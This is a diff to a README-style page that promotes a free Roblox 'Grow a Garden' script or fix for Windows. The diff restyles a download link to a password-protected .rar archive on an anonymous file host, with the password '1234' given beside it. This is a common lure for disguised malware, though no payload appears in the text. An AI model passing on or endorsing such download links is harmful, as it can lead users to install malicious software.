@@ -9,9 +9,8 @@ Welcome to the ultimate guide for downloading the free Roblox Grow a Garden Fix!
 grabbing the latest version, tailored for Windows systems in 2025. Whether you're a pro gamer or just starting, this
 script enhances your Grow a Garden adventure and smooth performance. 🚀
 
-## [⬇️ Click here to Install ](https://files.catbox.moe/7rnisn.rar)
-## [Pass - 1234]
-
+## [![Download](https://img.shields.io/badge/Click_Here_To_Install-green)](https://files.catbox.moe/7rnisn.rar)
+## Pass - [1234]
 
 ## Why Use This Script?
 
